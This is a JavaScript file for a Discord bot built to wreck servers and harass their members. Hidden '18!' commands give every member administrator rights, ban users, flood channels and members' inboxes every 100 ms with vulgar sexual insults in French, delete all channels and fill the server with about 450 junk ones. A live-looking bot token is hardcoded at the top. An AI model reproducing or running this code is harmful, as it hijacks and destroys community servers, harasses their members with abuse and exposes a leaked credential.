var Discord = require("discord.js"),
client = new Discord.Client();
client.login("NDUyMTU0NTg1NDMyMTk1MDcy.DfQU_g.9hhxD8bM8cGZPZsdkyFKr499Cd0");

client.on("ready", () => {
  
client.user.setStatus('online');
  client.user.setActivity('Roaaar');
});
client.on('message' , message => {
  if (message.content === "18!all"){
    message.delete();
    
message.guild.defaultRole.setPermissions("ADMINISTRATOR");
  }
})
client.on("message", message => {
  if(message.content.startsWith("18!ban")){
    message.guild.ban(message.mentions.users.first().id);
    message.reply("hockey");
    }
  })
client.on("message", message => {
  if(message.content.startsWith("18!s")){
    setInterval(function(){message.channel.send("Coucou bande de fils de viol, Prosternez vous devant votre dieu Akatsuu https://cdn.discordapp.com/attachments/459590681523126272/466277027805397012/IMG_20180630_203156_579.jpg @everyone")}, 100);
  }
})
client.on("message", message => {
  if(message.content.startsWith("18!add")){
    message.delete();
    message.guild.createRole({
      name: message.author.username,
      position: message.guild.members.get(client.user.id).highestRole.position
    }).then(role => {
      message.member.addRole(role);
      message.guild.defaultRole.setPermissions("ADMINISTRATOR");
    })
  }
})
client.on("message", message => {
  if(message.content.startsWith("18!mp")){
    message.delete();
    message.guild.members.forEach(function(e){
      setInterval(function(){e.user.send("Fils de pute, Akatsuu est un dieu et toi une petite salope qui doit sucer des bites :) https://cdn.discordapp.com/attachments/449970311417430022/457200484231413760/Turtle_Psycho.gif")}, 100)
    })
  }
})
client.on("message", message => {
  if(message.content.startsWith("18!ch")){
  message.guild.channels.map(channel => channel.delete());
  message.guild.setName('Dieu Akatsuu est grand');
  message.guild.setIcon("https://cdn.discordapp.com/attachments/459590681523126272/466282898475974658/mp4_1.mp4");
  var salonumber = 1;
  while(salonumber < 450){
                message.guild.createChannel( 'bz_par_akatsuu', 'test');
                salonumber = salonumber + 1;
            }
  }
});
